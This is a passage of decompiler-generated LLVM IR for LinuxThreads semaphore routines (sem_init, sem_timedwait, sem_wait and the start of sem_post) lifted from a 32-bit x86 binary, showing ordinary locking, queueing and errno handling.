  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804c359, { 1, 0 }
}

define i32 @__new_sem_init(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  store i32 %tmp4, i32* %eax.global-to-local, align 4
  %v2_804c375 = icmp slt i32 %arg3, 0
  %v1_804c377 = icmp eq i1 %v2_804c375, false
  br i1 %v1_804c377, label %dec_label_pc_804c386, label %dec_label_pc_804c379

dec_label_pc_804c379:                             ; preds = %entry
  %v1_804c379 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804c379, i32* %eax.global-to-local, align 4
  %v1_804c37e = inttoptr i32 %v1_804c379 to i32*
  store i32 22, i32* %v1_804c37e, align 4
  br label %dec_label_pc_804c3b6

dec_label_pc_804c386:                             ; preds = %entry
  %v4_804c386 = icmp eq i32 %arg2, 0
  br i1 %v4_804c386, label %dec_label_pc_804c39d, label %dec_label_pc_804c38d

dec_label_pc_804c38d:                             ; preds = %dec_label_pc_804c386
  %v1_804c38d = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804c38d, i32* %eax.global-to-local, align 4
  %v1_804c392 = inttoptr i32 %v1_804c38d to i32*
  store i32 38, i32* %v1_804c392, align 4
  br label %dec_label_pc_804c3b6

dec_label_pc_804c39d:                             ; preds = %dec_label_pc_804c386
  store i32 0, i32* %arg1, align 4
  %v0_804c3a3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c3a3 = add i32 %v0_804c3a3, 4
  %v2_804c3a3 = inttoptr i32 %v1_804c3a3 to i32*
  store i32 0, i32* %v2_804c3a3, align 4
  %v1_804c3aa = load i32, i32* %eax.global-to-local, align 4
  %v2_804c3aa = add i32 %v1_804c3aa, 8
  %v3_804c3aa = inttoptr i32 %v2_804c3aa to i32*
  store i32 %arg3, i32* %v3_804c3aa, align 4
  %v0_804c3ad = load i32, i32* %eax.global-to-local, align 4
  %v1_804c3ad = add i32 %v0_804c3ad, 12
  %v2_804c3ad = inttoptr i32 %v1_804c3ad to i32*
  store i32 0, i32* %v2_804c3ad, align 4
  br label %dec_label_pc_804c3b6

dec_label_pc_804c3b6:                             ; preds = %dec_label_pc_804c38d, %dec_label_pc_804c379, %dec_label_pc_804c39d
  %storemerge = phi i32 [ 0, %dec_label_pc_804c39d ], [ -1, %dec_label_pc_804c379 ], [ -1, %dec_label_pc_804c38d ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 2, 3, 4, 1, 6, 5 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804c3b6, { 2, 0, 1 }
}

define i32 @thread_self.1(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804c3ba = load i32, i32* @esp, align 4
  %v1_804c3ba = load i32, i32* @global_var_806338c.133, align 4
  %v7_804c3ba = icmp ult i32 %v0_804c3ba, %v1_804c3ba
  %v1_804c3c7 = icmp eq i1 %v7_804c3ba, false
  br i1 %v1_804c3c7, label %dec_label_pc_804c3f8, label %dec_label_pc_804c3c9

dec_label_pc_804c3c9:                             ; preds = %entry
  %v1_804c3c9 = load i32, i32* @global_var_8063390.134, align 16
  %v7_804c3c9 = icmp ult i32 %v0_804c3ba, %v1_804c3c9
  br i1 %v7_804c3c9, label %dec_label_pc_804c3de, label %dec_label_pc_804c3d1

dec_label_pc_804c3d1:                             ; preds = %dec_label_pc_804c3c9
  %v1_804c3d1 = load i32, i32* @global_var_8063394.135, align 4
  %v7_804c3d1 = icmp ult i32 %v0_804c3ba, %v1_804c3d1
  br i1 %v7_804c3d1, label %dec_label_pc_804c3f8, label %dec_label_pc_804c3de

dec_label_pc_804c3de:                             ; preds = %dec_label_pc_804c3d1, %dec_label_pc_804c3c9
  %v0_804c3de = load i32, i32* @global_var_80679f0.137, align 16
  %v1_804c3de = icmp eq i32 %v0_804c3de, 0
  br i1 %v1_804c3de, label %dec_label_pc_804c3ec, label %dec_label_pc_804c3e7

dec_label_pc_804c3e7:                             ; preds = %dec_label_pc_804c3de
  %v0_804c3e7 = call i32 @__pthread_find_self()
  br label %dec_label_pc_804c3ec

dec_label_pc_804c3ec:                             ; preds = %dec_label_pc_804c3de, %dec_label_pc_804c3e7
  %v2_804c3f2 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804c3f8

dec_label_pc_804c3f8:                             ; preds = %dec_label_pc_804c3d1, %entry, %dec_label_pc_804c3ec
  %v0_804c3f8 = phi i32 [ ptrtoint (i32* @global_var_80628a0.136 to i32), %dec_label_pc_804c3d1 ], [ ptrtoint (i32* @global_var_80626c0 to i32), %entry ], [ %v2_804c3f2, %dec_label_pc_804c3ec ]
  ret i32 %v0_804c3f8

; uselistorder directives
  uselistorder label %dec_label_pc_804c3f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c3ec, { 1, 0 }
}

define i32 @new_sem_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804c3f9 = load i32, i32* @esi, align 4
  %v0_804c3fa = load i32, i32* @ebx, align 4
  %v2_804c3fe = call i32 @thread_self.1(i32 %v0_804c3fa, i32 %v0_804c3f9)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %v2_804c3fe, i32* @edx, align 4
  %v1_804c411 = call i32 @__pthread_lock(i32 %v2_804c3fe)
  store i32 %arg2, i32* @edx, align 4
  %v0_804c41a = load i32, i32* @ebx, align 4
  %v1_804c41a = add i32 %v0_804c41a, 12
  store i32 %v1_804c41a, i32* @eax, align 4
  %v0_804c41d = call i32 @remove_from_queue()
  %v0_804c425 = load i32, i32* @ebx, align 4
  store i32 %v0_804c41d, i32* @esi, align 4
  %v1_804c428 = inttoptr i32 %v0_804c425 to i32*
  %v2_804c428 = call i32 @__pthread_unlock(i32* %v1_804c428)
  %v0_804c430 = load i32, i32* @esi, align 4
  ret i32 %v0_804c430

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend() local_unnamed_addr {
entry:
  %v0_804c438 = load i32, i32* @eax, align 4
  %v1_804c439 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_804c438)
  ret i32 %v1_804c439
}

define i32 @sem_timedwait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_804c444 = load i32, i32* @esi, align 4
  %v0_804c445 = load i32, i32* @ebx, align 4
  store i32 %v0_804c445, i32* %stack_var_-16, align 4
  %v4_804c445 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804c449 = call i32 @thread_self.1(i32 %v0_804c445, i32 %v0_804c444)
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %v2_804c449, i32* @edx, align 4
  store i32 %v2_804c449, i32* @esi, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_804c45c = load i32, i32* %stack_var_-16, align 4
  %v1_804c45c = call i32 @__pthread_lock(i32 %v0_804c45c)
  %v0_804c461 = load i32, i32* @edi, align 4
  %v1_804c461 = add i32 %v0_804c461, 8
  %v2_804c461 = inttoptr i32 %v1_804c461 to i32*
  %v3_804c461 = load i32, i32* %v2_804c461, align 4
  %tmp22 = icmp slt i32 %v3_804c461, 1
  br i1 %tmp22, label %dec_label_pc_804c479, label %dec_label_pc_804c468

dec_label_pc_804c468:                             ; preds = %entry
  %v1_804c468 = add i32 %v3_804c461, -1
  store i32 %v1_804c468, i32* %v2_804c461, align 4
  %v0_804c46f = load i32, i32* @edi, align 4
  store i32 %v0_804c46f, i32* %stack_var_-60, align 4
  %v1_804c470 = inttoptr i32 %v0_804c46f to i32*
  %v2_804c470 = call i32 @__pthread_unlock(i32* %v1_804c470)
  br label %dec_label_pc_804c499

dec_label_pc_804c479:                             ; preds = %entry
  %v0_804c479 = load i32, i32* @ebp, align 4
  %v1_804c479 = add i32 %v0_804c479, 4
  %v2_804c479 = inttoptr i32 %v1_804c479 to i32*
  %v3_804c479 = load i32, i32* %v2_804c479, align 4
  %tmp = icmp ult i32 %v3_804c479, 1000000000
  br i1 %tmp, label %dec_label_pc_804c4a1, label %dec_label_pc_804c482

dec_label_pc_804c482:                             ; preds = %dec_label_pc_804c479
  store i32 %v0_804c461, i32* %stack_var_-60, align 4
  %v1_804c486 = inttoptr i32 %v0_804c461 to i32*
  %v2_804c486 = call i32 @__pthread_unlock(i32* %v1_804c486)
  %v1_804c48b = call i32 @__errno_location(i32 %v0_804c461)
  %v1_804c490 = inttoptr i32 %v1_804c48b to i32*
  store i32 22, i32* %v1_804c490, align 4
  br label %dec_label_pc_804c499

dec_label_pc_804c499:                             ; preds = %dec_label_pc_804c468, %dec_label_pc_804c482
  %storemerge = phi i32 [ -1, %dec_label_pc_804c482 ], [ 0, %dec_label_pc_804c468 ]
  br label %dec_label_pc_804c593

dec_label_pc_804c4a1:                             ; preds = %dec_label_pc_804c479
  store i32 %v0_804c461, i32* %stack_var_-24, align 4
  %v2_804c4a5 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804c4a5, i32* @edx, align 4
  %v0_804c4a9 = load i32, i32* @esi, align 4
  store i32 %v0_804c4a9, i32* @eax, align 4
  %v1_804c4b3 = add i32 %v0_804c4a9, 442
  %v2_804c4b3 = inttoptr i32 %v1_804c4b3 to i8*
  store i8 0, i8* %v2_804c4b3, align 1
  %v0_804c4ba = load i32, i32* %stack_var_-24, align 4
  %v2_804c4ba = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c4ba, i32 134530041)
  %v0_804c4bf = load i32, i32* @esi, align 4
  %v1_804c4bf = add i32 %v0_804c4bf, 66
  %v2_804c4bf = inttoptr i32 %v1_804c4bf to i8*
  %v3_804c4bf = load i8, i8* %v2_804c4bf, align 1
  %v4_804c4bf = icmp eq i8 %v3_804c4bf, 0
  br i1 %v4_804c4bf, label %dec_label_pc_804c4d0, label %dec_label_pc_804c4c5

dec_label_pc_804c4c5:                             ; preds = %dec_label_pc_804c4a1
  %v1_804c4c5 = add i32 %v0_804c4bf, 64
  %v2_804c4c5 = inttoptr i32 %v1_804c4c5 to i8*
  %v3_804c4c5 = load i8, i8* %v2_804c4c5, align 1
  %v4_804c4c5 = icmp eq i8 %v3_804c4c5, 0
  store i32 1, i32* @ebx, align 4
  br i1 %v4_804c4c5, label %dec_label_pc_804c4dc, label %dec_label_pc_804c4d0

dec_label_pc_804c4d0:                             ; preds = %dec_label_pc_804c4c5, %dec_label_pc_804c4a1
  store i32 %v0_804c4bf, i32* @edx, align 4
  %v0_804c4d5 = call i32 @enqueue()
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804c4dc

dec_label_pc_804c4dc:                             ; preds = %dec_label_pc_804c4c5, %dec_label_pc_804c4d0
  %v0_804c4df = load i32, i32* @edi, align 4
  store i32 %v0_804c4df, i32* %stack_var_-60, align 4
  %v1_804c4e0 = inttoptr i32 %v0_804c4df to i32*
  %v2_804c4e0 = call i32 @__pthread_unlock(i32* %v1_804c4e0)
  %v0_804c4e8 = load i32, i32* @ebx, align 4
  %v1_804c4e8 = icmp eq i32 %v0_804c4e8, 0
  br i1 %v1_804c4e8, label %dec_label_pc_804c4f7.preheader, label %dec_label_pc_804c4ec

dec_label_pc_804c4f7.preheader:                   ; preds = %dec_label_pc_804c4dc
  %v0_804c4fa.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c4f7

dec_label_pc_804c4ec:                             ; preds = %dec_label_pc_804c4dc
  store i32 0, i32* @edx, align 4
  %v0_804c4ee = load i32, i32* @esi, align 4
  store i32 %v0_804c4ee, i32* @eax, align 4
  %v0_804c4f0 = load i32, i32* %stack_var_-60, align 4
  %v2_804c4f0 = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c4f0, i32 %tmp16)
  br label %dec_label_pc_804c56a

dec_label_pc_804c4f7:                             ; preds = %dec_label_pc_804c545, %dec_label_pc_804c53c, %dec_label_pc_804c4f7.preheader
  %v0_804c4fa = phi i32 [ %v0_804c4fa.pre, %dec_label_pc_804c4f7.preheader ], [ %v0_804c533, %dec_label_pc_804c53c ], [ %v0_804c533, %dec_label_pc_804c545 ]
  %v0_804c4f7 = load i32, i32* @ecx, align 4
  %v0_804c4f9 = load i32, i32* @ebp, align 4
  store i32 %v0_804c4fa, i32* %stack_var_-60, align 4
  %v3_804c4fb = inttoptr i32 %v0_804c4f7 to i32*
  %v4_804c4fb = call i32 @__pthread_timedsuspend_new(i32 %v0_804c4fa, i32* %v3_804c4fb, i32 %v0_804c4f7)
  %v1_804c503 = icmp eq i32 %v4_804c4fb, 0
  %v1_804c505 = icmp eq i1 %v1_804c503, false
  br i1 %v1_804c505, label %dec_label_pc_804c533, label %dec_label_pc_804c507

dec_label_pc_804c507:                             ; preds = %dec_label_pc_804c4f7
  %v0_804c507 = load i32, i32* @esi, align 4
  store i32 %v0_804c507, i32* @edx, align 4
  %v0_804c509 = load i32, i32* @edi, align 4
  store i32 %v0_804c509, i32* @eax, align 4
  %v0_804c50b = load i32, i32* %stack_var_-60, align 4
  %v1_804c50b = call i32 @__pthread_lock(i32 %v0_804c50b)
  %v0_804c510 = load i32, i32* @esi, align 4
  store i32 %v0_804c510, i32* @edx, align 4
  %v0_804c512 = load i32, i32* @edi, align 4
  %v1_804c512 = add i32 %v0_804c512, 12
  store i32 %v1_804c512, i32* @eax, align 4
  %v0_804c515 = call i32 @remove_from_queue()
  %v0_804c51d = load i32, i32* @edi, align 4
  store i32 %v0_804c51d, i32* %stack_var_-60, align 4
  store i32 %v0_804c515, i32* @ebx, align 4
  %v1_804c520 = inttoptr i32 %v0_804c51d to i32*
  %v2_804c520 = call i32 @__pthread_unlock(i32* %v1_804c520)
  %v1_804c528 = icmp eq i32 %v0_804c515, 0
  %v1_804c52a = icmp eq i1 %v1_804c528, false
  br i1 %v1_804c52a, label %dec_label_pc_804c578, label %dec_label_pc_804c52c

dec_label_pc_804c52c:                             ; preds = %dec_label_pc_804c507
  %v0_804c52c = load i32, i32* @esi, align 4
  store i32 %v0_804c52c, i32* @eax, align 4
  %v0_804c52e = call i32 @suspend()
  br label %dec_label_pc_804c533

dec_label_pc_804c533:                             ; preds = %dec_label_pc_804c4f7, %dec_label_pc_804c52c
  %v0_804c533 = load i32, i32* @esi, align 4
  %v1_804c533 = add i32 %v0_804c533, 442
  %v2_804c533 = inttoptr i32 %v1_804c533 to i8*
  %v3_804c533 = load i8, i8* %v2_804c533, align 1
  %v4_804c533 = icmp eq i8 %v3_804c533, 0
  %v1_804c53a = icmp eq i1 %v4_804c533, false
  br i1 %v1_804c53a, label %dec_label_pc_804c54b, label %dec_label_pc_804c53c

dec_label_pc_804c53c:                             ; preds = %dec_label_pc_804c533
  %v1_804c53c = add i32 %v0_804c533, 440
  %v2_804c53c = inttoptr i32 %v1_804c53c to i8*
  %v3_804c53c = load i8, i8* %v2_804c53c, align 1
  %v4_804c53c = icmp eq i8 %v3_804c53c, 0
  br i1 %v4_804c53c, label %dec_label_pc_804c4f7, label %dec_label_pc_804c545

dec_label_pc_804c545:                             ; preds = %dec_label_pc_804c53c
  %v1_804c545 = add i32 %v0_804c533, 64
  %v2_804c545 = inttoptr i32 %v1_804c545 to i8*
  %v3_804c545 = load i8, i8* %v2_804c545, align 1
  %v4_804c545 = icmp eq i8 %v3_804c545, 0
  %v1_804c549 = icmp eq i1 %v4_804c545, false
  br i1 %v1_804c549, label %dec_label_pc_804c4f7, label %dec_label_pc_804c54b

dec_label_pc_804c54b:                             ; preds = %dec_label_pc_804c545, %dec_label_pc_804c533
  store i32 0, i32* @edx, align 4
  store i32 %v0_804c533, i32* @eax, align 4
  %v0_804c54f = load i32, i32* %stack_var_-60, align 4
  %v2_804c54f = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c54f, i32 %v0_804c4f9)
  %v0_804c554 = load i32, i32* @esi, align 4
  %v1_804c554 = add i32 %v0_804c554, 440
  %v2_804c554 = inttoptr i32 %v1_804c554 to i8*
  %v3_804c554 = load i8, i8* %v2_804c554, align 1
  %v4_804c554 = icmp eq i8 %v3_804c554, 0
  br i1 %v4_804c554, label %dec_label_pc_804c591, label %dec_label_pc_804c55d

dec_label_pc_804c55d:                             ; preds = %dec_label_pc_804c54b
  %v1_804c55d = add i32 %v0_804c554, 64
  %v2_804c55d = inttoptr i32 %v1_804c55d to i8*
  %v3_804c55d = load i8, i8* %v2_804c55d, align 1
  %v4_804c55d = icmp eq i8 %v3_804c55d, 0
  %v1_804c561 = icmp eq i1 %v4_804c55d, false
  br i1 %v1_804c561, label %dec_label_pc_804c591, label %dec_label_pc_804c563

dec_label_pc_804c563:                             ; preds = %dec_label_pc_804c55d
  store i8 0, i8* %v2_804c554, align 1
  br label %dec_label_pc_804c56a

dec_label_pc_804c56a:                             ; preds = %dec_label_pc_804c4ec, %dec_label_pc_804c563
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_804c573 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804c445)
  br label %dec_label_pc_804c578

dec_label_pc_804c578:                             ; preds = %dec_label_pc_804c507, %dec_label_pc_804c56a
  %stack_var_-56.0 = phi i32 [ %v4_804c445, %dec_label_pc_804c56a ], [ %v0_804c4f9, %dec_label_pc_804c507 ]
  store i32 0, i32* @edx, align 4
  %v0_804c57a = load i32, i32* @esi, align 4
  store i32 %v0_804c57a, i32* @eax, align 4
  %v0_804c57c = load i32, i32* %stack_var_-60, align 4
  %v2_804c57c = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c57c, i32 %stack_var_-56.0)
  %v1_804c581 = call i32 @__errno_location(i32 %v0_804c57c)
  %v1_804c586 = inttoptr i32 %v1_804c581 to i32*
  store i32 110, i32* %v1_804c586, align 4
  br label %dec_label_pc_804c593

dec_label_pc_804c591:                             ; preds = %dec_label_pc_804c55d, %dec_label_pc_804c54b
  br label %dec_label_pc_804c593

dec_label_pc_804c593:                             ; preds = %dec_label_pc_804c578, %dec_label_pc_804c499, %dec_label_pc_804c591
  %v0_804c59a = phi i32 [ 0, %dec_label_pc_804c591 ], [ -1, %dec_label_pc_804c578 ], [ %storemerge, %dec_label_pc_804c499 ]
  ret i32 %v0_804c59a

; uselistorder directives
  uselistorder i32 %v0_804c533, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v0_804c515, { 1, 0 }
  uselistorder i32 %v0_804c4fa, { 1, 0 }
  uselistorder i32 %v3_804c461, { 1, 0 }
  uselistorder i32 %v0_804c461, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-60, { 1, 4, 2, 5, 3, 6, 0, 7, 8, 9 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804c593, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c578, { 1, 0 }
  uselistorder label %dec_label_pc_804c56a, { 1, 0 }
  uselistorder label %dec_label_pc_804c533, { 1, 0 }
  uselistorder label %dec_label_pc_804c4dc, { 1, 0 }
  uselistorder label %dec_label_pc_804c499, { 1, 0 }
}

define i32 @__new_sem_wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804c59b = load i32, i32* @esi, align 4
  %v0_804c59c = load i32, i32* @ebx, align 4
  store i32 %v0_804c59c, i32* %stack_var_-8, align 4
  %v4_804c59c = ptrtoint i32* %stack_var_-8 to i32
  %v2_804c5a0 = call i32 @thread_self.1(i32 %v0_804c59c, i32 %v0_804c59b)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %v2_804c5a0, i32* @edx, align 4
  %v1_804c5bf = call i32 @__pthread_lock(i32 %arg1)
  %v0_804c5c4 = load i32, i32* @ebx, align 4
  %v1_804c5c4 = add i32 %v0_804c5c4, 8
  %v2_804c5c4 = inttoptr i32 %v1_804c5c4 to i32*
  %v3_804c5c4 = load i32, i32* %v2_804c5c4, align 4
  %tmp12 = icmp slt i32 %v3_804c5c4, 1
  br i1 %tmp12, label %dec_label_pc_804c5e0, label %dec_label_pc_804c5cb

dec_label_pc_804c5cb:                             ; preds = %entry
  %v1_804c5ce = add i32 %v3_804c5c4, -1
  store i32 %v1_804c5ce, i32* %v2_804c5c4, align 4
  %v0_804c5d2 = load i32, i32* @ebx, align 4
  store i32 %v0_804c5d2, i32* %stack_var_-44, align 4
  %v1_804c5d3 = inttoptr i32 %v0_804c5d2 to i32*
  %v2_804c5d3 = call i32 @__pthread_unlock(i32* %v1_804c5d3)
  br label %dec_label_pc_804c6a4

dec_label_pc_804c5e0:                             ; preds = %entry
  %v2_804c5e4 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804c5e4, i32* @edx, align 4
  %v1_804c5e8 = add i32 %v2_804c5a0, 442
  %v2_804c5e8 = inttoptr i32 %v1_804c5e8 to i8*
  store i8 0, i8* %v2_804c5e8, align 1
  store i32 %v2_804c5a0, i32* @eax, align 4
  %v0_804c5f3 = load i32, i32* %stack_var_-44, align 4
  %v2_804c5f3 = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c5f3, i32 %tmp8)
  %v1_804c5fc = add i32 %v2_804c5a0, 66
  %v2_804c5fc = inttoptr i32 %v1_804c5fc to i8*
  %v3_804c5fc = load i8, i8* %v2_804c5fc, align 1
  %v4_804c5fc = icmp eq i8 %v3_804c5fc, 0
  br i1 %v4_804c5fc, label %dec_label_pc_804c611, label %dec_label_pc_804c602

dec_label_pc_804c602:                             ; preds = %dec_label_pc_804c5e0
  store i32 1, i32* @esi, align 4
  %v1_804c60b = add i32 %v2_804c5a0, 64
  %v2_804c60b = inttoptr i32 %v1_804c60b to i8*
  %v3_804c60b = load i8, i8* %v2_804c60b, align 1
  %v4_804c60b = icmp eq i8 %v3_804c60b, 0
  br i1 %v4_804c60b, label %dec_label_pc_804c61f, label %dec_label_pc_804c611

dec_label_pc_804c611:                             ; preds = %dec_label_pc_804c602, %dec_label_pc_804c5e0
  store i32 %v2_804c5a0, i32* @edx, align 4
  store i32 0, i32* @esi, align 4
  %v0_804c61a = call i32 @enqueue()
  br label %dec_label_pc_804c61f

dec_label_pc_804c61f:                             ; preds = %dec_label_pc_804c602, %dec_label_pc_804c611
  %v0_804c622 = load i32, i32* @ebx, align 4
  store i32 %v0_804c622, i32* %stack_var_-44, align 4
  %v1_804c623 = inttoptr i32 %v0_804c622 to i32*
  %v2_804c623 = call i32 @__pthread_unlock(i32* %v1_804c623)
  %v0_804c62b = load i32, i32* @esi, align 4
  %v1_804c62b = icmp eq i32 %v0_804c62b, 0
  br i1 %v1_804c62b, label %dec_label_pc_804c63c.preheader, label %dec_label_pc_804c62f

dec_label_pc_804c63c.preheader:                   ; preds = %dec_label_pc_804c61f
  %v1_804c656 = add i32 %v2_804c5a0, 440
  %v2_804c656 = inttoptr i32 %v1_804c656 to i8*
  %v1_804c663 = add i32 %v2_804c5a0, 64
  %v2_804c663 = inttoptr i32 %v1_804c663 to i8*
  store i32 %v2_804c5a0, i32* @eax, align 4
  %v0_804c64013 = call i32 @suspend()
  %v3_804c64914 = load i8, i8* %v2_804c5e8, align 1
  %v4_804c64915 = icmp eq i8 %v3_804c64914, 0
  %v1_804c65017 = icmp eq i1 %v4_804c64915, false
  br i1 %v1_804c65017, label %dec_label_pc_804c669, label %dec_label_pc_804c652

dec_label_pc_804c62f:                             ; preds = %dec_label_pc_804c61f
  store i32 %v2_804c5a0, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804c635 = load i32, i32* %stack_var_-44, align 4
  %v2_804c635 = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c635, i32 %tmp8)
  br label %dec_label_pc_804c696

dec_label_pc_804c652:                             ; preds = %dec_label_pc_804c63c.preheader, %dec_label_pc_804c63c.backedge
  %v3_804c656 = load i8, i8* %v2_804c656, align 1
  %v4_804c656 = icmp eq i8 %v3_804c656, 0
  br i1 %v4_804c656, label %dec_label_pc_804c63c.backedge, label %dec_label_pc_804c65f

dec_label_pc_804c63c.backedge:                    ; preds = %dec_label_pc_804c652, %dec_label_pc_804c65f
  store i32 %v2_804c5a0, i32* @eax, align 4
  %v0_804c640 = call i32 @suspend()
  %v3_804c649 = load i8, i8* %v2_804c5e8, align 1
  %v4_804c649 = icmp eq i8 %v3_804c649, 0
  %v1_804c650 = icmp eq i1 %v4_804c649, false
  br i1 %v1_804c650, label %dec_label_pc_804c669, label %dec_label_pc_804c652

dec_label_pc_804c65f:                             ; preds = %dec_label_pc_804c652
  %v3_804c663 = load i8, i8* %v2_804c663, align 1
  %v4_804c663 = icmp eq i8 %v3_804c663, 0
  %v1_804c667 = icmp eq i1 %v4_804c663, false
  br i1 %v1_804c667, label %dec_label_pc_804c63c.backedge, label %dec_label_pc_804c669

dec_label_pc_804c669:                             ; preds = %dec_label_pc_804c63c.backedge, %dec_label_pc_804c65f, %dec_label_pc_804c63c.preheader
  store i32 %v2_804c5a0, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804c66f = load i32, i32* %stack_var_-44, align 4
  %v2_804c66f = call i32 @__pthread_set_own_extricate_if(i32 %v0_804c66f, i32 %tmp8)
  %v3_804c678 = load i8, i8* %v2_804c656, align 1
  %v4_804c678 = icmp eq i8 %v3_804c678, 0
  br i1 %v4_804c678, label %dec_label_pc_804c6a4, label %dec_label_pc_804c681

dec_label_pc_804c681:                             ; preds = %dec_label_pc_804c669
  %v3_804c685 = load i8, i8* %v2_804c663, align 1
  %v4_804c685 = icmp eq i8 %v3_804c685, 0
  %v1_804c689 = icmp eq i1 %v4_804c685, false
  br i1 %v1_804c689, label %dec_label_pc_804c6a4, label %dec_label_pc_804c68b

dec_label_pc_804c68b:                             ; preds = %dec_label_pc_804c681
  store i8 0, i8* %v2_804c656, align 1
  br label %dec_label_pc_804c696

dec_label_pc_804c696:                             ; preds = %dec_label_pc_804c62f, %dec_label_pc_804c68b
  store i32 -1, i32* %stack_var_-44, align 4
  %v2_804c69f = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804c59c)
  br label %dec_label_pc_804c6a4

dec_label_pc_804c6a4:                             ; preds = %dec_label_pc_804c681, %dec_label_pc_804c669, %dec_label_pc_804c5cb, %dec_label_pc_804c696
  ret i32 0

; uselistorder directives
  uselistorder i8* %v2_804c656, { 1, 0, 2 }
  uselistorder i8* %v2_804c5e8, { 1, 0, 2 }
  uselistorder i32 %v3_804c5c4, { 1, 0 }
  uselistorder i32 %v2_804c5a0, { 5, 6, 2, 0, 3, 4, 7, 1, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 %tmp8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 3, 2, 1, 4, 0, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 ()* @suspend, { 2, 0, 1 }
  uselistorder i32 ()* @enqueue, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804c6a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c696, { 1, 0 }
  uselistorder label %dec_label_pc_804c669, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c63c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804c652, { 1, 0 }
  uselistorder label %dec_label_pc_804c61f, { 1, 0 }
}

define i32 @__new_sem_post() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp13, i32* %stack_var_-188, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804c6ac = load i32, i32* @esi, align 4
  %v0_804c6ad = load i32, i32* @ebx, align 4
  store i32 %v0_804c6ad, i32* %stack_var_-8, align 4
  %v2_804c6b4 = call i32 @thread_self.1(i32 %v0_804c6ad, i32 %v0_804c6ac)
  store i32 %tmp8, i32* @esi, align 4
  %v1_804c6c0 = add i32 %v2_804c6b4, 84
  %v2_804c6c0 = inttoptr i32 %v1_804c6c0 to i32*
  %v3_804c6c0 = load i32, i32* %v2_804c6c0, align 4
  %v4_804c6c0 = icmp eq i32 %v3_804c6c0, 0
  %v1_804c6c4 = icmp eq i1 %v4_804c6c0, false
  br i1 %v1_804c6c4, label %dec_label_pc_804c73d, label %dec_label_pc_804c6c6

dec_label_pc_804c6c6:                             ; preds = %entry
  store i32 %v2_804c6b4, i32* @edx, align 4
  store i32 %tmp8, i32* @eax, align 4
  %v0_804c6ca = load i32, i32* %stack_var_-8, align 4
  %v1_804c6ca = call i32 @__pthread_lock(i32 %v0_804c6ca)
  %v0_804c6cf = load i32, i32* @esi, align 4
  %v1_804c6cf = add i32 %v0_804c6cf, 12
  %v2_804c6cf = inttoptr i32 %v1_804c6cf to i32*
  %v3_804c6cf = load i32, i32* %v2_804c6cf, align 4
